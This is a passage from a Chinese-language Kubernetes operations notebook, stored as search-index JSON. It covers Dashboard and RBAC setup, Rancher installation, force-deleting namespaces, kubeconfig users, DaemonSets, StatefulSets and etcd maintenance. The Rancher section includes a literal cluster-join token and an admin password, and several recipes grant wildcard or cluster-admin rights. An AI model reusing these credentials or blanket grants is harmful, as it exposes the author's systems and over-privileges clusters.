<p>\u7a76\u5176\u539f\u56e0\u662fChrome\u6d4f\u89c8\u5668\u5bf9\u7ad9\u70b9\u8bbf\u95ee\u5b89\u5168\u7ea7\u522b\u8f83\u9ad8\u3002</p> <p>\u6f14\u793a\u6548\u679c</p> <p></p> <p>\u62f7\u8d1d\u4e4b\u524d\u7684token\uff0c\u901a\u8fc7Token\u7684\u767b\u5f55\u9009\u9879\u5373\u53ef\u3002</p>"},{"location":"kubernetes/29-dashboard/#_3","title":"\u4e09\u3001\u6743\u9650\u89e3\u6790","text":"<p>\u7528\u6237</p> <pre><code>root@K-KUBE-LAB-01:~# kubectl -n kube-system get sa dashboard-admin\nNAME              SECRETS   AGE\ndashboard-admin   1         5d23h\nroot@K-KUBE-LAB-01:~# kubectl -n kube-system get sa dashboard-admin -o yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  creationTimestamp: \"2021-08-17T02:55:23Z\"\n  name: dashboard-admin\n  namespace: kube-system\n  resourceVersion: \"6750\"\n  uid: 31044793-79b3-455c-8e6e-b853d003162c\nsecrets:\n- name: dashboard-admin-token-gkm76\n</code></pre> <p>\u6743\u9650</p> <pre><code>root@K-KUBE-LAB-01:~# kubectl -n kube-system get clusterrolebinding dashboard-admin -o yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  creationTimestamp: \"2021-08-17T02:55:23Z\"\n  name: dashboard-admin\n  resourceVersion: \"6752\"\n  uid: 7fa29bdc-eaa3-46b3-a0a4-f9985a2602fe\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: dashboard-admin\n  namespace: kube-system\nroot@K-KUBE-LAB-01:~# kubectl -n kube-system get ClusterRole cluster-admin -o yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  annotations:\n    rbac.authorization.kubernetes.io/autoupdate: \"true\"\n  creationTimestamp: \"2021-08-17T02:01:54Z\"\n  labels:\n    kubernetes.io/bootstrapping: rbac-defaults\n  name: cluster-admin\n  resourceVersion: \"91\"\n  uid: d7698abc-af4f-4320-a81f-79a53ce45291\nrules:\n- apiGroups:\n  - '*'\n  resources:\n  - '*'\n  verbs:\n  - '*'\n- nonResourceURLs:\n  - '*'\n  verbs:\n  - '*'\n</code></pre>"},{"location":"kubernetes/29-rancher/","title":"Rancher","text":"<p>docs</p>"},{"location":"kubernetes/29-rancher/#_1","title":"\u4e00\u3001\u5355\u4f53\u5b89\u88c5","text":""},{"location":"kubernetes/29-rancher/#11","title":"1.1 \u5b89\u88c5\u8fc7\u7a0b","text":"<pre><code># \u81ea\u7b7e\u8bc1\u4e66\ndocker run -d --restart=unless-stopped \\\n  --name rancher \\\n  -p 80:80 -p 443:443 \\\n  --privileged \\\n  hub.8ops.top/google_containers/rancher:v2.6.8 \n\n# \u516c\u6709\u8bc1\u4e66\ndocker run -d --privileged --restart=unless-stopped \\\n  --name rancher \\\n  -p 80:80 -p 443:443 \\\n  -v /opt/certs/8ops.top.crt:/etc/rancher/ssl/cert.pem \\\n  -v /opt/certs/8ops.top.key:/etc/rancher/ssl/key.pem \\\n  hub.8ops.top/google_containers/rancher:v2.6.8 \\\n  --no-cacerts\n\n# --------- Join Cluster --------- #\n# Existing Cluster\n# Example\n#    https://books.8ops.top/attachment/kubernetes/20-rancher-agent.yaml\nkubectl apply -f 20-rancher-agent.yaml\n\n# Create Cluster\ndocker run -d --privileged --restart=unless-stopped --net=host \\\n    -v /etc/kubernetes:/etc/kubernetes \\\n    -v /var/run:/var/run \\\n    hub.8ops.top/google_containers/rancher-agent:v2.6.8 \\\n    --server https://rancher.8ops.top \\\n    --token bshb2rg26cxlpwrrzvbg4jg4n7ddr8hhmwcs4l45wl7ntjxrqgntb2 \\\n    --etcd --controlplane --worker\n</code></pre>"},{"location":"kubernetes/29-rancher/#12","title":"1.2 \u6f14\u793a\u6548\u679c","text":"<p><code>https://rancher.8ops.top</code></p> <pre><code># \u83b7\u53d6\u5bc6\u7801\ndocker logs  rancher  2&gt;&amp;1 | grep \"Bootstrap Password:\"\n\n# \u7b2c\u4e00\u6b21\u767b\u5f55\u9700\u8981\u91cd\u7f6e\u5bc6\u7801\nadmin / rancher@2022\n</code></pre> <p>Existing Cluster</p> <p></p> <p></p> <p>Create Cluster</p>"},{"location":"kubernetes/29-rancher/#helm","title":"\u4e8c\u3001Helm \u5b89\u88c5","text":"<pre><code>helm repo add rancher https://releases.rancher.com/server-charts/latest\nhelm search repo rancher\nhelm show values rancher/rancher &gt; rancher.yaml-2.6.8-default\n\nhelm install rancher rancher/rancher \\\n    -f rancher.yaml-2.6.8 \\\n    -n kube-cattle \\\n    --create-namespace \\\n    --version 2.6.8 --debug\n</code></pre> <ul> <li>\u672a\u6210\u529f\uff0c\u5f53\u524d\u6700\u9ad8\u7248\u672c\u7684 2.6.8 \u4ec5\u652f\u6301 &lt; kubenetes v1.25.0-0</li> </ul>"},{"location":"kubernetes/30-readme/","title":"\u5e94\u7528\u96c6\u9526","text":"<p>\u5f3a\u5236\u5220\u9664\u547d\u4ee4\u7a7a\u95f4</p> <pre><code># 1\nkubectl delete ns &lt;ns&gt; --force=true --grace-period=0\n\n# 2\nkubectl get ns kube-server -o json &gt; kube-server.json\n\n## edit kube-server.json\n# spec.finalize=[]\n\nkubectl proxy \n\ncurl -i -k -H \"Content-Type: application/json\" \\\n  -X PUT \\\n  --data-binary @kube-server.json \\\n  http://127.0.0.1:8001/api/v1/namespaces/kube-server/finalize\n\n# 3\nkubectl get ns kube-server -o json &gt; kube-server.json\n\n## edit kube-server.json\n# spec.finalize=[]\nkubectl replace --raw \"/api/v1/namespaces/kube-server/finalize\" -f kube-server.json\n\n# 3\nkubectl proxy\n\npython3 force-remove.py kube-server\n\n#!/usr/bin/env python3\nimport atexit\nimport json\nimport requests\nimport subprocess\nimport sys\n\nnamespace = sys.argv[1]\nproxy_process = subprocess.Popen(['kubectl', 'proxy'])\natexit.register(proxy_process.kill)\np = subprocess.Popen(['kubectl', 'get', 'namespace', namespace, '-o', 'json'], stdout=subprocess.PIPE)\np.wait()\ndata = json.load(p.stdout)\ndata['spec']['finalizers'] = []\nrequests.put('http://127.0.0.1:8001/api/v1/namespaces/{}/finalize'.format(namespace), json=data).raise_for_status()\n\n# 4\nkubectl edit ns kube-server\n## remove config\n#  finalizers:\n#  - controller.cattle.io/namespace-auth\n</code></pre>"},{"location":"kubernetes/30-resource/","title":"\u8d44\u6e90\u96c6\u9526","text":"\u8d44\u6e90 \u5e94\u7528\u573a\u666f rancher From datacenter to cloud to edge, Rancher lets you deliver Kubernetes-as-a-Service. argocd Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. kubesphere The container platform tailored for Kubernetes multi-cloud, datacenter, and edge management kubekey Install Kubernetes/K3s only, both Kubernetes/K3s and KubeSphere, and related cloud-native add-ons, it supports all-in-one, multi-node, and HA k9s Kubernetes CLI To Manage Your Clusters In Style! k3s Lightweight Kubernetes minikube Run Kubernetes locally MetalLB MetalLB is a load-balancer implementation for bare metal Kubernetes clusters, using standard routing protocols. OpenELB Load Balancer Implementation for Kubernetes in Bare-Metal, Edge, and Virtualization PureLB A Dual Stack Service Load Balancer Controller for Kubernetes. flannel flannel is a network fabric for containers, designed for Kubernetes calico Calico is an open source networking and network security solution for containers, virtual machines, and native host-based workloads. Calico supports a broad range of platforms including Kubernetes, OpenShift, Mirantis Kubernetes Engine (MKE), OpenStack, and bare metal services. cillium eBPF-based Networking, Security, and Observability weave Simple, resilient multi-host containers networking and more. argocd Declarative continuous delivery with a fully-loaded UI. kubefirst Kubefirst is a fully automated and operational open source platform that includes some of the best tools available in the Kubernetes space, all working together from a single command. <p>Reference</p> <ul> <li>https://www.51cto.com/article/707574.html</li> <li>https://ebpf.io/</li> </ul> <p>eBPF</p> <ul> <li>bcc</li> <li>bpftrace</li> <li>cilium</li> <li>falco</li> <li>katran</li> <li>sysdig</li> </ul>"},{"location":"kubernetes/31-kubeconfig/","title":"kubeconfig","text":""},{"location":"kubernetes/31-kubeconfig/#_1","title":"\u4e00\u3001\u591a\u96c6\u7fa4\u7ba1\u7406","text":"<p>Reference</p>"},{"location":"kubernetes/31-kubeconfig/#_2","title":"\u4e8c\u3001\u521b\u5efa\u7528\u6237\u5e76\u6388\u6743","text":"<p>\u7ecf\u6d4b\u8bd5\u9700\u8981\u5728 Control-plane \u8282\u70b9\u7b7e\u540d\u624d\u6709\u6548</p> <pre><code># \u65b0\u7528\u6237\u57fa\u672c\u4fe1\u606f\nUSER=guest\nCA_CRT=/etc/kubernetes/pki/ca.crt\nCA_KEY=/etc/kubernetes/pki/ca.key\nSERVER=https://10.101.11.110:6443\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#21-create","title":"2.1 create","text":"<pre><code># \u521b\u5efa\u65b0\u7528\u6237\u7b7e\u540d\u8bc1\u4e66\nopenssl genrsa -out ${USER}.key 2048\nopenssl req -new -key ${USER}.key -out ${USER}.csr -subj \"/C=CN/ST=ShangHai/L=ShangHai/O=Kubernetes/OU=GAT/CN=${USER}\"\nopenssl x509 -req -in ${USER}.csr \\\n    -CA ${CA_CRT} -CAkey ${CA_KEY} -CAcreateserial \\\n    -out ${USER}.crt -days 365\n\n# \u8bbe\u7f6e\u96c6\u7fa4\u53c2\u6570\nkubectl config set-cluster kubernetes \\\n    --certificate-authority=${CA_CRT} \\\n    --embed-certs=true \\\n    --server=${SERVER} \\\n    --kubeconfig=${USER}.kubeconfig\n\n# \u8bbe\u7f6e\u5ba2\u6237\u7aef\u8ba4\u8bc1\u53c2\u6570\nkubectl config set-credentials ${USER} \\\n    --client-certificate=${USER}.crt \\\n    --client-key=${USER}.key \\\n    --embed-certs=true \\\n    --kubeconfig=${USER}.kubeconfig\n\n# \u8bbe\u7f6e\u4e0a\u4e0b\u6587\u53c2\u6570\nkubectl config set-context ${USER}@kubernetes \\\n    --cluster=kubernetes \\\n    --user=${USER} \\\n    --kubeconfig=${USER}.kubeconfig\n\n# \u8bbe\u7f6e\u9ed8\u8ba4\u4e0a\u4e0b\u6587\nkubectl config use-context ${USER}@kubernetes --kubeconfig=${USER}.kubeconfig\n\n# \u67e5\u770bkubeconfig\u5185\u5bb9\nkubectl config view --kubeconfig ${USER}.kubeconfig\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#22-binding","title":"2.2 binding","text":"<p>\u6388\u6743\u65b9\u5f0f\u6709\u4e24\u79cd</p> <ol> <li> <p>Role+RoleBinding</p> </li> <li> <p>ClusterRole+ClusterRoleBinding</p> </li> </ol>"},{"location":"kubernetes/31-kubeconfig/#221-role","title":"2.2.1 role","text":"<pre><code>NAMESPACE=kube-app\n\nkubectl -n ${NAMESPACE} create role user-op-for-${USER} \\\n  --verb=* \\\n  --resource=* \n\n    namespace: kube-app\n# \u66f4\u591a\u6743\u9650\n#- apiGroups: [\"\", \"extensions\", \"apps\"]\n#  verbs: [\"create\", \"delete\", \"get\", \"list\", \"patch\", \"update\", \"watch\"]\n#  resources: [\"*\"]\n\n# \u5168\u90e8\u6743\u9650\n# verbs: [\"create\", \"delete\", \"get\", \"list\", \"patch\", \"update\", \"watch\"]\n\n# \u547d\u540d\u7a7a\u95f4\u90e8\u5206\u8d44\u6e90\u53ea\u8bfb\u6743\u9650\nkubectl -n ${NAMESPACE} edit role user-op-for-${USER}\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"pods/log\", \"services\", \"replicationcontrollers\", \"configmaps\", \"persistentvolumeclaims\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"apps\"]\n  resources: [\"replicasets\", \"deployments\", \"daemonsets\", \"statefulsets\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"\"]\n  resources: [\"pods/exec\"]\n  verbs: [\"create\"]\n- apiGroups: [\"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"autoscaling\"]\n  resources: [\"horizontalpodautoscalers\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"batch\"]\n  resources: [\"cronjobs\",\"jobs\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n\nkubectl get all,cm,pvc,ing,hpa,jobs,cronjobs\n\nkubectl -n ${NAMESPACE} create rolebinding user-op-for-${USER}-binding \\\n  --role=user-op-for-${USER} \\\n  --user=${USER}\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#222-clusterrole","title":"2.2.2 clusterrole","text":"<pre><code># \u521b\u5efaClusterRole\nkubectl create clusterrole cluster-op-for-${USER} \\\n    --verb=get,list,watch \\\n    --resource=namespaces,nodes,pods,pods/log,deployments,replicasets,daemonsets,services,ingresses,endpoints,events,configmaps,statefulsets,secrets,jobs,cronjobs,replicationcontrollers,horizontalpodautoscalers \\\n    --dry-run=client -o yaml \n    # | kubectl apply -f -\n\n# edit rule: \u8fde\u63a5\u5bb9\u5668\nkubectl edit clusterrole cluster-op-for-${USER}\n\n- apiGroups:\n  - \"\"\n  resources:\n  - pods/exec\n  verbs:\n  - create\n\n# \u7ed1\u5b9a ClusterRoleBinding\nkubectl create clusterrolebinding cluster-op-for-${USER}-binding \\\n    --clusterrole=cluster-op-for-${USER} \\\n    --user=${USER} \n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#23-detele","title":"2.3 detele","text":"<pre><code>kubectl delete clusterrole cluster-op-for-${USER}\n\nkubectl delete clusterrolebinding cluster-op-for-${USER}-binding\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#24-quick","title":"2.4 quick","text":"<pre><code># \u5173\u8054\u67e5\u770b\u6743\u9650\nkubectl create clusterrolebinding cluster-op-for-${USER}-binding \\\n    --clusterrole=view --user=${USER}\n\n# \u5173\u8054\u7ba1\u7406\u6743\u9650\nkubectl create clusterrolebinding cluster-op-for-${USER}-binding \\\n    --clusterrole=cluster-admin --user=${USER}\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#25-view","title":"2.5 view","text":"<pre><code># \u67e5\u770b\u89d2\u8272\nkubectl get clusterrole | grep -E '^cluster-op-for-'  \nkubectl get clusterrolebinding | grep -E '^cluster-op-for-'\nkubectl get ServiceAccount -A | grep -E 'cluster-op-for-'\n\n# \u4f7f\u7528\u96c6\u9526\nkubectl --kubeconfig ${USER}.kubeconfig get nodes\nkubectl --kubeconfig ${USER}.kubeconfig get pods\nkubectl --kubeconfig ${USER}.kubeconfig get all\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#_3","title":"\u4e09\u3001\u793a\u4f8b","text":""},{"location":"kubernetes/31-kubeconfig/#31","title":"3.1 \u901a\u7528","text":"<pre><code># \u9002\u7528\u4e8ekubernetes v1.24.0 \u4e4b\u540e\u7684\u7248\u672c\nUSER=guest\nkubectl delete clusterrole cluster-op-for-${USER}\nkubectl create clusterrole cluster-op-for-${USER} \\\n    --verb=get,list,watch \\\n    --resource=namespaces,nodes,pods,pods/log,deployments,replicasets,daemonsets,services,ingresses,endpoints,events,configmaps,statefulsets,secrets,jobs,cronjobs,replicationcontrollers,horizontalpodautoscalers \\\n    --dry-run=client -o yaml | \\\n    kubectl apply -f -\nkubectl edit clusterrole cluster-op-for-${USER}    \n\n# add\n- apiGroups:\n  - \"\"\n  resources:\n  - pods/exec\n  verbs:\n  - create\n\nkubectl -n kube-server delete serviceaccount dashboard-${USER}\nkubectl -n kube-server create serviceaccount dashboard-${USER}\n\nkubectl delete clusterrolebinding dashboard-${USER} \nkubectl create clusterrolebinding dashboard-${USER} \\\n  --clusterrole=cluster-op-for-${USER} \\\n  --serviceaccount=kube-server:dashboard-${USER}\n\nkubectl -n kube-server delete dashboard-${USER}-secret\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-${USER}-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-${USER}\ntype: kubernetes.io/service-account-token\nEOF\n\nkubectl -n kube-server get secret dashboard-${USER}-secret \\\n    -o jsonpath={.data.token} | base64 --decode &gt; dashboard-${USER}.token\n</code></pre>"},{"location":"kubernetes/31-kubeconfig/#32","title":"3.2 \u5355\u79df\u6237","text":"<p>\u9650\u5b9a\u5728\u5355\u4e2a\u547d\u540d\u7a7a\u95f4\u7684 dashboard \u7684 token</p> <pre><code>USER=guest\nNAMESPACE=kube-app\nkubectl -n ${NAMESPACE} create serviceaccount dashboard-${USER} \n\nkubectl -n ${NAMESPACE} create role dashboard-${USER} \\\n  --verb=* \\\n  --resource=* \n\n#- verbs: [\"create\", \"delete\", \"get\", \"list\", \"patch\", \"update\", \"watch\"]  \n#  apiGroups: [\"\", \"extensions\", \"apps\"]  \n#  resources: [\"*\"]\n\nkubectl -n ${NAMESPACE} create rolebinding dashboard-${USER} \\\n  --role=dashboard-${USER} \\\n  --serviceaccount=kube-app:dashboard-${USER}\n\nkubectl describe secrets \\\n  -n ${NAMESPACE} $(kubectl -n ${NAMESPACE} get secret | awk '/dashboard-${USER}/{print $1}')\n</code></pre>"},{"location":"kubernetes/32-daemonset/","title":"daemon set","text":"<p>update-daemon-set</p>"},{"location":"kubernetes/32-daemonset/#create","title":"create","text":"<pre><code>---\napiVersion: extensions/v1beta1\nkind: DaemonSet\nmetadata:\n  name: node-job\n  namespace: kube-system\n  labels:\n    k8s-app: node-job\nspec:\n  updateStrategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 10\n  template:\n    metadata:\n      labels:\n        k8s-app: node-job\n    spec:\n      terminationGracePeriodSeconds: 30\n      containers:\n      - name: node-job\n        image: node-job:v20190909130012\n        env:\n        - name: WORK_IDC\n          value: ofc\n        - name: WORK_ENV\n          value: dev\n        securityContext:\n          runAsUser: 0\n        resources:\n          limits:\n            memory: 200Mi\n            cpu: 200m\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: data1\n          mountPath: /data1\n      volumes:\n      - name: data1\n        hostPath:\n          path: /data1\n---\n</code></pre>"},{"location":"kubernetes/32-daemonset/#rollout","title":"rollout","text":"<pre><code># \u83b7\u53d6\u662f\u5426\u652f\u6301\u6eda\u52a8\u66f4\u65b0\nkubectl -n kube-system get ds/node-job -o go-template='{{.spec.updateStrategy.rollingUpdate.maxUnavailable}}{{\"\\n\"}}'\n\n## return RollingUpdate\nkubectl -n kube-system get ds/node-job -o go-template='{{.spec.updateStrategy.type}}{{\"\\n\"}}' \n\n## return RollingUpdate\nkubectl -n kube-system create -f node-job-daemonset.yaml --dry-run -o go-template='{{.spec.updateStrategy.type}}{{\"\\n\"}}'\n\n# \u547d\u4ee4\u8bbe\u7f6e\u652f\u6301\u6eda\u52a8\u66f4\u65b0\nkubectl -n kube-system patch ds/node-job -p '{\"spec\":{\"updateStrategy\":{\"type\":\"RollingUpdate\",\"rollingUpdate\":{\"maxUnavailable\":5}}}}'\n\n# \u955c\u50cf\u5347\u7ea7\u6eda\u52a8\u66f4\u65b0\nkubectl -n kube-system set image ds/node-job node-job=node-job:v20190909130012\n\n# json\u8f93\u51fa\nkubectl -n kube-system get ds/node-job -o json\n\n# \u6839\u636elabel\u8fc7\u6ee4po\nkubectl -n kube-system get po -l k8s-app=node-job -o wide\n\n# watch rollout status\nkubectl -n kube-system rollout status ds/node-job\n\n# restart \nkubectl -n kube-system rollout restart ds/node-job\n</code></pre>"},{"location":"kubernetes/33-statefulset/","title":"statefulset","text":"<p>pv\u662f\u975e\u5fc5\u987b</p> <p>\u4f7f\u7528local volume\u65b9\u5f0f</p>"},{"location":"kubernetes/33-statefulset/#pv","title":"\u521b\u5efapv","text":"<p>web-pv-pvc.yaml</p> <pre><code>apiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: local-volume-nginx-0\n  labels:\n    pvname: local-volume-nginx-0\nspec:\n  capacity:\n    storage: 20Gi\n  volumeMode: Filesystem\n  accessModes:\n  - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Retain\n  storageClassName: local-volume\n  local:\n    path: /data1/pv-nginx\n  nodeAffinity:\n    required:\n      nodeSelectorTerms:\n      - matchExpressions:\n        - key: kubernetes.io/hostname\n          operator: In\n          values:\n          - 10.101.9.173\n          - 10.101.9.174\n          - 10.101.9.175\n---\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: local-volume-nginx-1\n  labels:\n    pvname: local-volume-nginx-1\nspec:\n  capacity:\n    storage: 20Gi\n  volumeMode: Filesystem\n  accessModes:\n  - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Retain\n  storageClassName: local-volume\n  local:\n    path: /data1/pv-nginx\n  nodeAffinity:\n    required:\n      nodeSelectorTerms:\n      - matchExpressions:\n        - key: kubernetes.io/hostname\n          operator: In\n          values:\n          - 10.101.9.173\n          - 10.101.9.174\n          - 10.101.9.175\n---\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: local-volume-nginx-2\n  labels:\n    pvname: local-volume-nginx-2\nspec:\n  capacity:\n    storage: 20Gi\n  volumeMode: Filesystem\n  accessModes:\n  - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Retain\n  storageClassName: local-volume\n  local:\n    path: /data1/pv-nginx\n  nodeAffinity:\n    required:\n      nodeSelectorTerms:\n      - matchExpressions:\n        - key: kubernetes.io/hostname\n          operator: In\n          values:\n          - 10.101.9.173\n          - 10.101.9.174\n          - 10.101.9.175\n---\nkind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: local-volume-nginx-web-0\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 20Gi\n  storageClassName: local-volume\n  selector:\n    matchLabels:\n      pvname: local-volume-nginx-0\n---\nkind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: local-volume-nginx-web-1\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 20Gi\n  storageClassName: local-volume\n  selector:\n    matchLabels:\n      pvname: local-volume-nginx-1\n---\nkind: PersistentVolumeClaim\napiVersion: v1\nmetadata:\n  name: local-volume-nginx-web-2\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 20Gi\n  storageClassName: local-volume\n  selector:\n    matchLabels:\n      pvname: local-volume-nginx-2\n</code></pre>"},{"location":"kubernetes/33-statefulset/#sts","title":"\u521b\u5efasts","text":"<pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    k8s-app: nginx\nspec:\n  ports:\n  - port: 80\n    name: web\n  clusterIP: None\n  selector:\n    k8s-app: nginx\n---\napiVersion: apps/v1beta1\nkind: StatefulSet\nmetadata:\n  name: web\nspec:\n  serviceName: \"nginx\"\n  podManagementPolicy: \"Parallel\"\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: local-volume-nginx\n          mountPath: /usr/share/nginx/html\n  volumeClaimTemplates:\n  - metadata:\n      name: local-volume-nginx\n    spec:\n      accessModes: [ \"ReadWriteOnce\" ]\n      storageClassName: \"local-volume\"\n      resources:\n        requests:\n          storage: 20Gi\n</code></pre>"},{"location":"kubernetes/33-statefulset/#_1","title":"\u7ba1\u7406","text":"<pre><code>kubectl run -it --rm --image busybox:latest dns-test --restart=Never /bin/sh\nping -c 2 web-0.nginx.default.svc.cluster.local\n\nkubectl scale sts/web --replicas=3\nkubectl patch sts/web -p '{\"spec\":{\"replicas\":2}}'\n\nkubectl get po -l k8s-app=nginx -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.containers[0].image}{\"\\t\"}{.spec.nodeName}{\"\\n\"}{end}'\n\nkubectl patch sts/web --type='json' -p='[{\"op\": \"replace\", \"path\": \"/spec/template/spec/containers/0/image\", \"value\":\"nginx-slim:0.7\"}]'\n\nkubectl patch sts/web -p '{\"spec\":{\"updateStrategy\":{\"type\":\"RollingUpdate\",\"rollingUpdate\":{\"partition\":1}}}}'\n\nkubectl get po/web-2 --template '{{range $i, $c := .spec.containers}}{{$c.image}}{{end}}'\n\nfor i in 0 1 2; do kubectl exec web-$i -- sh -c 'echo $(hostname) &gt; /usr/share/nginx/html/index.html'; done\n\nfor i in 0 1 2; do kubectl exec -it web-$i -- curl http://localhost/index.html; done\nfor i in 0 1 2; do kubectl exec -it web-$i -- curl http://localhost/ip.html; done\n\nweb-0 nginx-slim:0.7 10.101.9.175\nweb-1 nginx-slim:0.7 10.101.9.174\nweb-2 nginx-slim:0.7 10.101.9.173\n\nkubectl delete sts/web --cascade=false\n\nkubectl rollout restart sts/web\nkubectl rollout status  sts/web\n</code></pre>"},{"location":"kubernetes/39-etcd/","title":"etcd","text":""},{"location":"kubernetes/39-etcd/#_1","title":"\u4e00\u3001\u7ef4\u62a4\u96c6\u7fa4","text":"<p>\u5f53 master \u8282\u70b9\u53d8\u5316\u540e\u9700\u8981\u6838\u5b9e\u4fe1\u606f</p>"},{"location":"kubernetes/39-etcd/#11-member","title":"1.1 member","text":"<pre><code># The items in the lists are endpoint, ID, version, db size, is leader, is learner, raft term, raft index, raft applied index, errors.\netcdctl member list -w table \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status -w table \\\n  --cluster \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status -w table \\\n  --cluster \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint health -w table \\\n  --cluster \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre>"},{"location":"kubernetes/39-etcd/#12-operation","title":"1.2 operation","text":"<pre><code># \u5207\u6362leader\uff08--endpoints\u6307\u5411\u539fleader\uff09\netcdctl move-leader aa3d2ade73c186ec \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl member remove 6fb6887435ae87d5 \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl member add k-kube-lab-201 \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --peer-urls=https://10.101.11.114:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\n# \u6e05\u9664\u5b58\u50a8\u788e\u7247\netcdctl defrag \\\n  --endpoints=https://10.101.11.240:2379,https://10.101.11.114:2379,https://10.101.11.154:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre>"},{"location":"kubernetes/39-etcd/#13-endpoints","title":"1.3 endpoints","text":"<pre><code>kubectl -n kube-system edit kube-etcd\n</code></pre>"},{"location":"kubernetes/39-etcd/#_2","title":"\u4e8c\u3001\u642d\u5efa\u76d1\u63a7","text":""},{"location":"kubernetes/39-etcd/#21-prometheusetcd","title":"2.1 \u57fa\u4e8eprometheus\u76d1\u63a7etcd","text":"<pre><code># 1\uff0c\u521b\u5efa\u5ba2\u6237\u7aef\u8bc1\u4e66\nkubectl create secret generic etcd-certs \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.crt \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.key \\\n  --from-file=/etc/kubernetes/pki/etcd/ca.crt \\\n  -n kube-server\n\n# 2\uff0c\u6dfb\u52a0 prometheus's rule \u81ea\u53d1\u73b0\u8282\u70b9\n- job_name: kubernetes-etcd\n  honor_timestamps: true\n  scrape_interval: 1m\n  scrape_timeout: 10s\n  metrics_path: /metrics\n  scheme: https\n  tls_config:\n    ca_file: /var/run/secrets/kubernetes.io/etcd/ca.crt\n    cert_file: /var/run/secrets/kubernetes.io/etcd/healthcheck-client.crt\n    key_file: /var/run/secrets/kubernetes.io/etcd/healthcheck-client.key\n    insecure_skip_verify: false\n  follow_redirects: true\n  relabel_configs:\n  - source_labels: [__meta_kubernetes_service_label_app_kubernetes_io_name]\n    separator: ;\n    regex: etcd\n    replacement: $1\n    action: keep\n  kubernetes_sd_configs:\n  - role: endpoints\n    kubeconfig_file: \"\"\n    follow_redirects: true\n    namespaces:\n      own_namespace: false\n      names:\n      - kube-system\n</code></pre>"},{"location":"kubernetes/39-etcd/#_3","title":"\u4e09\u3001\u756a\u5916\u7bc7","text":""},{"location":"kubernetes/39-etcd/#31","title":"3.1 \u538b\u6d4b","text":"<p>Reference</p>"},{"location":"kubernetes/39-etcd/#311-","title":"3.1.1 \u538b\u6d4b-\u5199","text":"<pre><code># \u5047\u5b9a IP_1 \u662f leader, 